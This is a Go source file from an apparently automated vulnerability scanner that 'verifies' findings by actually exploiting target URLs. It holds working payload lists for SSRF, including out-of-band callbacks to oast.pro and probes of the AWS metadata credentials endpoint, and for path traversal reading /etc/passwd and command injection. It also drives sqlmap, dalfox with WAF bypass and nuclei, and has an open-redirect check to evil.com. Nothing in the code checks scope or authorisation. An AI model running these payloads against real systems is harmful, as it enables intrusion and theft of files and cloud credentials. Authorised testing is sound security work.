// verify.go â€” Real verification using interactsh OOB + actual exploitation
// Every finding goes through this pipeline before being reported.
package brain

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

// â”€â”€â”€ Finding Types â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

type RawFinding struct {
	Tool      string
	Type      string
	URL       string
	Evidence  string
	Payload   string
	Severity  string
	RawOutput string
}

type VerifiedFinding struct {
	RawFinding
	Confidence  float64
	Verified    bool
	VerifyProof string
	Duplicate   bool
	DupOf       string
}

// â”€â”€â”€ Deduplication â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

func Dedup(findings []RawFinding) []RawFinding {
	seen := make(map[string]bool)
	var unique []RawFinding
	for _, f := range findings {
		key := f.Type + "|" + normalizeURL(f.URL)
		if !seen[key] {
			seen[key] = true
			unique = append(unique, f)
		}
	}
	return unique
}

func normalizeURL(u string) string {
	if idx := strings.Index(u, "?"); idx != -1 {
		u = u[:idx]
	}
	if idx := strings.Index(u, "#"); idx != -1 {
		u = u[:idx]
	}
	return strings.ToLower(strings.TrimRight(u, "/"))
}

// â”€â”€â”€ Confidence Scoring â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

func ScoreConfidence(f RawFinding) float64 {
	score := 0.5
	toolWeights := map[string]float64{
		"nuclei": 0.7, "dalfox": 0.9, "sqlmap": 0.95,
		"commix": 0.9, "tplmap": 0.85, "ssrfmap": 0.8,
		"manual": 1.0, "xsstrike": 0.75, "kxss": 0.6, "gf": 0.4,
		"interactsh": 1.0, // OOB callback = 100% confirmed
	}
	if w, ok := toolWeights[f.Tool]; ok {
		score = w
	}
	if strings.Contains(f.Evidence, "alert(") || strings.Contains(f.Evidence, "confirm(") {
		score += 0.1
	}
	if strings.Contains(f.Evidence, "sleep(") || strings.Contains(f.Evidence, "SLEEP(") {
		score += 0.1
	}
	if strings.Contains(f.Evidence, "uid=") || strings.Contains(f.Evidence, "root:") {
		score += 0.2
	}
	if strings.Contains(f.Evidence, "interactsh") || strings.Contains(f.Evidence, "oob") {
		score += 0.3 // OOB callback = very high confidence
	}
	if f.Payload != "" {
		score += 0.05
	}
	if f.Severity == "critical" {
		score = score * 1.1
	}
	if score > 1.0 {
		score = 1.0
	}
	return score
}

func FilterByConfidence(findings []RawFinding, minConfidence float64) []RawFinding {
	var filtered []RawFinding
	for _, f := range findings {
		if ScoreConfidence(f) >= minConfidence {
			filtered = append(filtered, f)
		}
	}
	return filtered
}

// â”€â”€â”€ Auto-Verification â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

func VerifyFinding(f RawFinding) (bool, string) {
	switch f.Type {
	case "xss":
		return verifyXSS(f.URL, f.Payload)
	case "sqli":
		return verifySQLi(f.URL, f.Payload)
	case "ssrf":
		return verifySSRF(f.URL, f.Payload)
	case "open-redirect":
		return verifyOpenRedirect(f.URL)
	case "lfi":
		return verifyLFI(f.URL, f.Payload)
	case "rce":
		return verifyRCE(f.URL, f.Payload)
	default:
		return verifyWithNuclei(f.URL, f.Type)
	}
}

func verifyXSS(targetURL, payload string) (bool, string) {
	if _, err := exec.LookPath("dalfox"); err != nil {
		return false, "dalfox not installed"
	}
	args := []string{"url", targetURL, "--silence", "--no-color", "--waf-bypass"}
	if payload != "" {
		args = append(args, "--custom-payload", payload)
	}
	cmd := exec.Command("dalfox", args...)
	cmd.Stdin = nil
	out, err := runWithTimeout(cmd, 60)
	if err != nil {
		return false, ""
	}
	lower := strings.ToLower(out)
	if strings.Contains(lower, "poc") || strings.Contains(lower, "[v]") ||
		strings.Contains(lower, "verified") {
		return true, out
	}
	return false, ""
}

func verifySQLi(targetURL, payload string) (bool, string) {
	if _, err := exec.LookPath("sqlmap"); err != nil {
		return false, "sqlmap not installed"
	}
	cmd := exec.Command("sqlmap", "-u", targetURL, "--batch", "--level", "1", "--risk", "1",
		"--technique", "BT", "--output-dir", "/tmp/cybermind_verify_sqli/")
	cmd.Stdin = nil
	out, err := runWithTimeout(cmd, 120)
	if err != nil {
		return false, ""
	}
	if strings.Contains(out, "is vulnerable") || strings.Contains(out, "Parameter:") {
		return true, out
	}
	return false, ""
}

// â”€â”€â”€ REAL SSRF Verification via Interactsh OOB â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// verifySSRF uses interactsh for real out-of-band SSRF confirmation.
// This is 100% real â€” if interactsh gets a callback, SSRF is confirmed.
func verifySSRF(targetURL, payload string) (bool, string) {
	// Method 1: interactsh-client (best â€” real OOB callback)
	if verified, proof := verifySSRFInteractsh(targetURL); verified {
		return true, proof
	}
	// Method 2: ssrfmap tool
	if verified, proof := verifySSRFMap(targetURL); verified {
		return true, proof
	}
	// Method 3: direct metadata check (basic)
	return verifySSRFDirect(targetURL)
}

func verifySSRFInteractsh(targetURL string) (bool, string) {
	if _, err := exec.LookPath("interactsh-client"); err != nil {
		// Try to install it
		installInteractsh()
		if _, err2 := exec.LookPath("interactsh-client"); err2 != nil {
			return false, ""
		}
	}

	// Start interactsh-client, get a unique callback URL
	// interactsh-client -server interactsh.com -n 1 outputs the URL then waits
	sessionFile := "/tmp/cybermind_interactsh_session.txt"
	os.Remove(sessionFile)

	// Get a unique interactsh URL
	getURLCmd := exec.Command("interactsh-client",
		"-server", "oast.pro",
		"-n", "1",
		"-o", sessionFile,
		"-json",
	)
	getURLCmd.Stdin = nil

	// Run for 2 seconds to get the URL, then kill
	done := make(chan error, 1)
	go func() { done <- getURLCmd.Run() }()

	time.Sleep(2 * time.Second)

	// Read the session file to get the interactsh URL
	data, err := os.ReadFile(sessionFile)
	if err != nil || len(data) == 0 {
		if getURLCmd.Process != nil {
			getURLCmd.Process.Kill()
		}
		return false, ""
	}

	// Extract the interactsh URL from output
	interactshURL := ""
	for _, line := range strings.Split(string(data), "\n") {
		if strings.Contains(line, ".oast.pro") || strings.Contains(line, "interactsh") {
			interactshURL = strings.TrimSpace(line)
			break
		}
	}

	if interactshURL == "" {
		if getURLCmd.Process != nil {
			getURLCmd.Process.Kill()
		}
		return false, ""
	}

	// Inject the interactsh URL as SSRF payload
	ssrfPayloads := []string{
		"http://" + interactshURL,
		"https://" + interactshURL,
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
	}

	for _, ssrfPayload := range ssrfPayloads {
		// Try common SSRF parameter names
		for _, param := range []string{"url", "redirect", "next", "target", "dest", "destination", "redir", "uri", "path", "src", "source", "callback", "webhook"} {
			testURL := targetURL
			if strings.Contains(targetURL, "?") {
				testURL = targetURL + "&" + param + "=" + ssrfPayload
			} else {
				testURL = targetURL + "?" + param + "=" + ssrfPayload
			}
			resp, err := client.Get(testURL)
			if err == nil {
				resp.Body.Close()
			}
		}
	}

	// Wait 5 seconds for callback
	time.Sleep(5 * time.Second)

	// Check if interactsh received a callback
	data2, err := os.ReadFile(sessionFile)
	if err == nil && strings.Contains(string(data2), "dns") || strings.Contains(string(data2), "http") {
		if getURLCmd.Process != nil {
			getURLCmd.Process.Kill()
		}
		return true, fmt.Sprintf("SSRF confirmed via OOB callback to %s\nInteractsh log: %s", interactshURL, string(data2)[:min(500, len(data2))])
	}

	if getURLCmd.Process != nil {
		getURLCmd.Process.Kill()
	}
	return false, ""
}

func verifySSRFMap(targetURL string) (bool, string) {
	if _, err := exec.LookPath("ssrfmap"); err != nil {
		return false, ""
	}
	// Create a minimal request file
	reqFile := "/tmp/cybermind_ssrf_req.txt"
	reqContent := fmt.Sprintf("GET %s HTTP/1.1\nHost: target\n\n", targetURL)
	os.WriteFile(reqFile, []byte(reqContent), 0644)

	cmd := exec.Command("ssrfmap", "-r", reqFile, "-p", "url", "-m", "readfiles,aws")
	cmd.Stdin = nil
	out, err := runWithTimeout(cmd, 60)
	if err != nil {
		return false, ""
	}
	if strings.Contains(out, "SSRF") || strings.Contains(out, "vulnerable") || strings.Contains(out, "root:") {
		return true, out
	}
	return false, ""
}

func verifySSRFDirect(targetURL string) (bool, string) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
	}
	// Test AWS metadata endpoint
	for _, param := range []string{"url", "redirect", "next", "target", "dest", "uri", "src"} {
		for _, payload := range []string{
			"http://169.254.169.254/latest/meta-data/",
			"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		} {
			testURL := targetURL
			if strings.Contains(targetURL, "?") {
				testURL = targetURL + "&" + param + "=" + payload
			} else {
				testURL = targetURL + "?" + param + "=" + payload
			}
			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
			resp.Body.Close()
			bodyStr := string(body)
			if strings.Contains(bodyStr, "ami-id") || strings.Contains(bodyStr, "instance-id") ||
				strings.Contains(bodyStr, "AccessKeyId") || strings.Contains(bodyStr, "security-credentials") {
				return true, fmt.Sprintf("SSRF confirmed: AWS metadata accessible via param=%s\nResponse: %s", param, bodyStr[:min(300, len(bodyStr))])
			}
		}
	}
	return false, ""
}

func installInteractsh() {
	cmd := exec.Command("go", "install", "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest")
	cmd.Stdin = nil
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
	// Symlink
	for _, gobin := range []string{os.Getenv("HOME") + "/go/bin", "/root/go/bin"} {
		if _, err := os.Stat(gobin + "/interactsh-client"); err == nil {
			exec.Command("sudo", "ln", "-sf", gobin+"/interactsh-client", "/usr/local/bin/interactsh-client").Run()
			return
		}
	}
}

// â”€â”€â”€ REAL LFI Verification â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

func verifyLFI(targetURL, payload string) (bool, string) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
	}

	// Comprehensive LFI payloads â€” different encodings and depths
	lfiPayloads := []string{
		"../../../etc/passwd",
		"../../../../etc/passwd",
		"../../../../../etc/passwd",
		"../../../../../../etc/passwd",
		"....//....//....//etc/passwd",
		"..../..../..../etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"%252e%252e%252f%252e%252e%252fetc%252fpasswd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"/etc/passwd",
		"php://filter/convert.base64-encode/resource=/etc/passwd",
		"php://filter/read=convert.base64-encode/resource=/etc/passwd",
		"file:///etc/passwd",
	}
	if payload != "" {
		lfiPayloads = append([]string{payload}, lfiPayloads...)
	}

	// Try each payload on each parameter
	for _, p := range lfiPayloads {
		// Try replacing existing param values
		testURLs := []string{}
		if strings.Contains(targetURL, "=") {
			parts := strings.SplitN(targetURL, "=", 2)
			testURLs = append(testURLs, parts[0]+"="+p)
		}
		// Also try common file inclusion params
		for _, param := range []string{"file", "page", "include", "path", "template", "view", "doc", "document", "load", "read"} {
			if strings.Contains(targetURL, "?") {
				testURLs = append(testURLs, targetURL+"&"+param+"="+p)
			} else {
				testURLs = append(testURLs, targetURL+"?"+param+"="+p)
			}
		}

		for _, testURL := range testURLs {
			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
			resp.Body.Close()
			bodyStr := string(body)

			// Check for actual /etc/passwd content
			if strings.Contains(bodyStr, "root:x:0:0") || strings.Contains(bodyStr, "root:!:") ||
				strings.Contains(bodyStr, "/bin/bash") || strings.Contains(bodyStr, "/bin/sh") ||
				strings.Contains(bodyStr, "daemon:x:") || strings.Contains(bodyStr, "nobody:x:") {
				return true, fmt.Sprintf("LFI CONFIRMED!\nPayload: %s\nURL: %s\n/etc/passwd content:\n%s",
					p, testURL, bodyStr[:min(500, len(bodyStr))])
			}

			// Check for base64-encoded /etc/passwd (PHP filter)
			if strings.Contains(p, "base64") && len(bodyStr) > 100 {
				// Try to detect base64 encoded passwd
				if strings.Contains(bodyStr, "cm9vdDp4OjA6") { // base64 of "root:x:0:"
					return true, fmt.Sprintf("LFI CONFIRMED via PHP filter!\nPayload: %s\nBase64 /etc/passwd detected", p)
				}
			}
		}
	}
	return false, ""
}

// â”€â”€â”€ REAL RCE Verification â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

func verifyRCE(targetURL, payload string) (bool, string) {
	// Use a unique time-based marker to detect RCE
	marker := fmt.Sprintf("cybermind%d", time.Now().UnixNano()%999999)
	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
	}

	// RCE payloads â€” different injection contexts
	rcePayloads := []string{
		fmt.Sprintf("echo %s", marker),
		fmt.Sprintf("`echo %s`", marker),
		fmt.Sprintf("$(echo %s)", marker),
		fmt.Sprintf(";echo %s;", marker),
		fmt.Sprintf("&&echo %s&&", marker),
		fmt.Sprintf("||echo %s||", marker),
		fmt.Sprintf("| echo %s", marker),
		fmt.Sprintf("\necho %s\n", marker),
		// Windows
		fmt.Sprintf("&echo %s&", marker),
		fmt.Sprintf("|echo %s|", marker),
	}
	if payload != "" {
		rcePayloads = append([]string{payload}, rcePayloads...)
	}

	for _, p := range rcePayloads {
		testURLs := []string{}
		if strings.Contains(targetURL, "=") {
			parts := strings.SplitN(targetURL, "=", 2)
			testURLs = append(testURLs, parts[0]+"="+p)
		}
		for _, param := range []string{"cmd", "exec", "command", "run", "query", "ping", "host", "ip"} {
			if strings.Contains(targetURL, "?") {
				testURLs = append(testURLs, targetURL+"&"+param+"="+p)
			} else {
				testURLs = append(testURLs, targetURL+"?"+param+"="+p)
			}
		}

		for _, testURL := range testURLs {
			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
			resp.Body.Close()
			if strings.Contains(string(body), marker) {
				return true, fmt.Sprintf("RCE CONFIRMED!\nPayload: %s\nURL: %s\nMarker '%s' found in response:\n%s",
					p, testURL, marker, string(body)[:min(300, len(body))])
			}
		}
	}

	// Time-based RCE detection (sleep)
	return verifyRCETimeBased(targetURL, client)
}

func verifyRCETimeBased(targetURL string, client *http.Client) (bool, string) {
	sleepPayloads := []string{
		"sleep 5", "`sleep 5`", "$(sleep 5)", ";sleep 5;",
		"ping -c 5 127.0.0.1", // Windows: ping -n 5 127.0.0.1
	}
	for _, p := range sleepPayloads {
		testURL := targetURL
		if strings.Contains(targetURL, "=") {
			parts := strings.SplitN(targetURL, "=", 2)
			testURL = parts[0] + "=" + p
		}
		start := time.Now()
		resp, err := client.Get(testURL)
		elapsed := time.Since(start)
		if err == nil {
			resp.Body.Close()
		}
		// If response took 4+ seconds, sleep command executed
		if elapsed >= 4*time.Second {
			return true, fmt.Sprintf("RCE CONFIRMED via time-based detection!\nPayload: %s\nResponse time: %s (expected ~5s for sleep)", p, elapsed)
		}
	}
	return false, ""
}

func verifyOpenRedirect(targetURL string) (bool, string) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
	}
	testURL := targetURL
	if strings.Contains(targetURL, "=") {
		parts := strings.SplitN(targetURL, "=", 2)
		testURL = parts[0] + "=https://evil.com"
	}
	resp, err := client.Get(testURL)
	if err != nil {
		return false, ""
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		location := resp.Header.Get("Location")
		if strings.Contains(location, "evil.com") {
			return true, fmt.Sprintf("Open Redirect CONFIRMED!\nRedirects to: %s", location)
		}
	}
	return false, ""
}

func verifyWithNuclei(targetURL, findingType string) (bool, string) {
	if _, err := exec.LookPath("nuclei"); err != nil {
		return false, "nuclei not installed"
	}
	tagMap := map[string]string{
		"exposure": "exposure", "misconfig": "misconfig",
		"takeover": "takeover", "default-login": "default-logins", "cve": "cve",
	}
	tag := "misconfiguration"
	if t, ok := tagMap[findingType]; ok {
		tag = t
	}
	cmd := exec.Command("nuclei", "-u", targetURL, "-tags", tag,
		"-severity", "critical,high,medium", "-silent", "-no-color")
	cmd.Stdin = nil
	out, err := runWithTimeout(cmd, 60)
	if err != nil {
		return false, ""
	}
	if strings.TrimSpace(out) != "" {
		return true, out
	}
	return false, ""
}

func runWithTimeout(cmd *exec.Cmd, timeoutSec int) (string, error) {
	done := make(chan error, 1)
	var outBuf strings.Builder
	cmd.Stdout = &outBuf
	cmd.Stderr = &outBuf
	cmd.Stdin = nil
	go func() { done <- cmd.Run() }()
	select {
	case err := <-done:
		return outBuf.String(), err
	case <-time.After(time.Duration(timeoutSec) * time.Second):
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
		return outBuf.String(), fmt.Errorf("timeout after %ds", timeoutSec)
	}
}

